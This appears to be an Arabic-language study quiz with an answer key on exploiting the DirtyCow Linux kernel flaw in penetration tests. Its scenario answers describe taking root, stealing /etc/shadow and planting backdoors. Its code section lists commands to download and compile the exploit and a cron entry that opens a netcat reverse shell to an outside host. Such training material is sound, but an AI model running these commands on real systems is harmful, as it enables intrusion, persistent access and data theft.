# **أسئلة إكمال الفراغات**
##### 1. ال DirtyCow هي ثغرة في ______ لينكس اكتشفت سنة 2016.  
   **نواة**

##### 2. الثغرة بتستغل ميزة تسمى ______ في إدارة الذاكرة.  
   **Copy-on-Write**

##### 3. الهدف من DirtyCow هو ______ الصلاحيات لتصير root.  
   **تصعيد**

##### 4. أمر ______ بيوريك إصدار الـ Kernel عشان تعرف لو متأثر.  
   **uname -r**

##### 5. الـ Exploit بيعدل ملف زي ______ عشان يضيف مستخدم جديد.  
   **/etc/passwd**

---

# **أسئلة صح وغلط**
##### 6. ال DirtyCow بتسمح لمستخدم عادي يكتب في ملفات Read-Only. (صح/غلط)  
   **صح**

##### 7. الثغرة دي بتأثر كل إصدارات Kernel لينكس حتى الجديدة. (صح/غلط)  
   **غلط** - بتأثر من 2.6.22 لـ 4.8.3 بس.

##### 8. لو شغلت `./dirtycow` هيفتح Shell تلقائيًا بدون خطوات تانية. (صح/غلط)  
   **غلط** - بيضيف مستخدم، لازم تسجل دخول بيه.

##### 9. ال `nmap -sV` بيستخدم عشان تشوف إصدار الـ Kernel. (صح/غلط)  
   **غلط** - بيستخدم لفحص الخدمات، مش الـ Kernel.

##### 10. في الـ Pentesting، لازم توثق الإصدار المتأثر في التقرير. (صح/غلط)  
 صح

---

# **أسئلة اختيار من متعدد**
11. إيه اللي بتستغله DirtyCow في النظام؟  
    أ) إدارة الذاكرة  
    ب) الشبكة  
    ج) الـ API  
    د) الملفات العادية  
    **أ) إدارة الذاكرة**

12. إيه الأداة اللي بتستخدمها عشان تفحص خدمات السيرفر في البداية؟  
    أ) gcc  
    ب) Nmap  
    ج) wget  
    د) nc  
    **ب) Nmap**

13. إيه اللي ممكن تعمله لو استغليت DirtyCow بنجاح؟  
    أ) تصعيد الصلاحيات  
    ب) تسريب كلمات السر  
    ج) إضافة Backdoor  
    د) كل اللي فوق  
    **د) كل اللي فوق**

14. إيه اللي بيخلّي DirtyCow خطيرة؟  
    أ) بتسمح بتعديل ملفات محمية  
    ب) بتغير إعدادات الشبكة  
    ج) بتمنع الوصول للملفات  
    د) بتحدث النظام  
    **أ) بتسمح بتعديل ملفات محمية**

15. إيه الأمر اللي بيأكد إنك بقيت root بعد الاستغلال؟  
    أ) `whoami`  
    ب) `id`  
    ج) `uname -r`  
    د) `cat /etc/passwd`  
    **ب) `id`**

---

# **أسئلة "لماذا" لتفسير المفاهيم**
16. ليه DirtyCow بتعتبر ثغرة خطيرة في لينكس؟  
    **لأنها بتسمح لمستخدم عادي يكتب في ملفات محمية ويصعد لـ root بسهولة.**

17. ليه بتستخدم `uname -r` في الـ Pentesting مع DirtyCow؟  
    **عشان تعرف إصدار الـ Kernel وتتأكد إذا كان متأثر بالثغرة أو لا.**

18. ليه الـ Exploit بيعدل ملف `/etc/passwd`؟  
    **لأنه بيضيف مستخدم جديد بصلاحيات root عشان تقدر تسيطر على النظام.**

19. ليه حالة السباق (Race Condition) مهمة في DirtyCow؟  
    **لأنها اللي بتخلّي النظام يسمح بالكتابة في ملفات المفروض محمية.**

20. ليه إضافة Backdoor بعد الاستغلال مفيدة؟  
    **عشان تضمن إنك ترجع للنظام تاني كـ root بسهولة حتى لو اتعدل.**

---

# **أسئلة ربط المفاهيم ببعضها**
##### 21. إزاي تربط بين DirtyCow وتصعيد الصلاحيات؟  

ال**DirtyCow بتستغل عيب في الذاكرة عشان تكتب في ملفات محمية وتديك صلاحيات root.**

##### 22. إيه العلاقة بين `uname -r` وتشغيل الـ Exploit؟  

ال **`uname -r` بيأكد إذا كان الـ Kernel متأثر، وبعدين تشغل الـ Exploit لو مناسب

##### 23. إزاي تعديل `/etc/passwd` بيساعدك تتحكم في النظام؟

**بتضيف مستخدم بصلاحيات root، فتقدر تسجل دخول كـ root وتتحكم كامل.**

##### 24. إزاي Nmap بيساعدك في استغلال DirtyCow؟  

**بيكشف الخدمات زي Apache، لو وصلت لـ Shell منها تبدأ تختبر DirtyCow.**

##### 25. إيه الرابط بين Command Injection وDirtyCow؟  

ال **Command Injection بيديك Shell عادي، وDirtyCow بتصعد منه لـ root لو الـ Kernel متأثر.**

---

# **أسئلة للفهم (عميقة من سيناريوهات واقعية لـ Web Pentesting)**

##### 26. لو كنت بتختبر موقع تسوق ولقيت Shell كـ `www-data` و`uname -r` رجع `3.2.0-23-generic`، إزاي تستغل DirtyCow؟  
**بتنزل `dirty.c`، تجمعه بـ `gcc`، تشغل `./dirtycow`، وتاخد root بإضافة مستخدم جديد.**

##### 27. تخيل إنك بتختبر سيرفر بنك ووصلت لـ Shell عن طريق Command Injection، وشفت الـ Kernel متأثر، إيه خطتك؟ 

**بتشغل DirtyCow عشان تضيف مستخدم root، تسجل دخول، وتسرق بيانات حساسة زي `/etc/shadow`.**

##### 28. لو كنت بتختبر منصة تعليمية ولقيت `uname -r` بيرجع `4.4.0-21-generic`، إزاي تثبت وجود ثغرة؟  
**بتنزل الـ Exploit، تشغله، وتتأكد من `/etc/passwd` لو اتضاف مستخدم جديد بصلاحيات root.**

##### 29. لو سيرفر حكومي وصلت لـ Shell كـ `www-data` والـ Kernel قديم، إزاي تستفيد من DirtyCow؟  
**بتستغل الثغرة تضيف Backdoor في `/etc/cron.d`، وتبلغ إنك قدرت تتحكم كامل.**

##### 30. تخيل إنك بتختبر شركة شحن ولقيت الـ Kernel متأثر بـ DirtyCow، إيه اللي هتعمله كـ Pentester؟  
**بتشغل الـ Exploit، تاخد root، وتثبت إنك قدرت تسرق بيانات الشحن من النظام.**

##### 31. لو كنت بتختبر تطبيق طبي ووصلت لـ Shell والـ Kernel في النطاق المتأثر، إزاي تحول ده لتسريب؟  
**بتستخدم DirtyCow تضيف مستخدم root، تاخد `/etc/shadow`، وتوري إن بيانات المرضى في خطر.**

##### 32. لو سيرفر دفع أونلاين لقيت فيه `3.16.0-38-generic`، إزاي تستغل DirtyCow كـ Web Pentester؟  
**بتشغل الـ Exploit، تصعد لـ root، وتضيف Backdoor عشان ترجع للنظام بعدين.**

##### 33. تخيل إنك بتختبر موقع سفر ووصلت لـ Shell والـ Kernel متأثر، إزاي تثبت خطورة DirtyCow؟  
 **بتعدل `/etc/passwd` بـ DirtyCow، تسجل كـ root، وتوري إنك قدرت تتحكم في الحجوزات.**

##### 34. لو كنت بتختبر منصة عقارية والـ Kernel قديم، إزاي تستخدم DirtyCow تثبت الضعف؟  
**بتشغل الـ Exploit، تاخد root، وتسرق بيانات العقارات من النظام.**

##### 35. لو سيرفر بيع تذاكر لقيت `uname -r` بيرجع إصدار متأثر، إزاي تستفيد كـ Pentester؟  
**بتستغل DirtyCow تضيف مستخدم root، تاخد Shell كامل، وتبلغ إن بيانات العملاء معرضة.**

---

# **أسئلة كتابة كود**
##### 36. اكتب أمر عشان تفحص إصدار الـ Kernel.  
    uname -r

##### 37. اكتب أمر عشان تنزل كود DirtyCow من الإنترنت.  
    wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirty.c 

##### 38. اكتب أمر عشان تجمع كود DirtyCow.  
    gcc -pthread dirty.c -o dirtycow

##### 39. اكتب أمر عشان تتحقق من إضافة مستخدم جديد بعد الـ Exploit.  
    cat /etc/passwd

##### 40. اكتب أمر عشان تضيف Backdoor في النظام بعد ما تبقى root.  
    echo "nc -e /bin/bash 192.168.1.100 9999" > /etc/cron.d/backdoor

---

# **أسئلة الخلاصة**
##### 41. قولي الخلاصة بتاعت الجزء الأول ("إيه هو DirtyCow (CVE-2016-5195)؟").

**"يعني زي ما تكون لقيت خرم في حيطة السجن، تدخل منه وتطلع الكبير بتاع الحبس! DirtyCow يعني بتستغل عيب في النظام عشان تكتب في حاجات المفروض ماتقربلهاش وتبقى root."**

##### 42. قولي الخلاصة بتاعت الجزء التاني ("ليه المشكلة دي خطيرة؟").  

**"الثغرة دي خطيرة لأنها زي ما تكون لقيت مفتاح السجن في الزبالة، فتحت الباب وطلعت الباشا بتاع الكل! لو لقيتها، يبقى النظام في إيدك في ثواني."**

##### 43. قولي الخلاصة بتاعت الجزء التالت ("إزاي نستغلها في الـ Pentesting؟").  

**"لما تلاقي DirtyCow، زي ما تكون لقيت عصاية سحرية في لعبة، تضرب بيها وتبقى الكبير بتاع الماتش في ثانية!"**

##### 44. قولي الخلاصة بتاعت الجزء الرابع ("خطوات عملية للاستغلال في Pentesting").  

**"الخطوات دي زي ما تكون لقيت سلاح في لعبة، ضربت بيه الكل، وطلعت الكبير بتاع الحتة! DirtyCow لما تلاقيها، يبقى النظام في جيبك في دقايق."**

##### 45. قولي الخلاصة النهائية بتاعت النص كله.  

 **"الDirtyCow (CVE-2016-5195) هي ثغرة خطيرة في نواة لينكس بتخلّيك تصعد من مستخدم عادي لـ root عن طريق استغلال عيب في الذاكرة.
في الـ Pentesting، دور عليها في الأنظمة القديمة بـ `uname -r`، استخدم الـ Exploit عشان تاخد Shell كـ root، ووري العميل إن سيرفره زي بيت مكسور لو ما حدثش! بالطريقة دي، تبقى البطل بتاع اللعبة بسهولة!"**
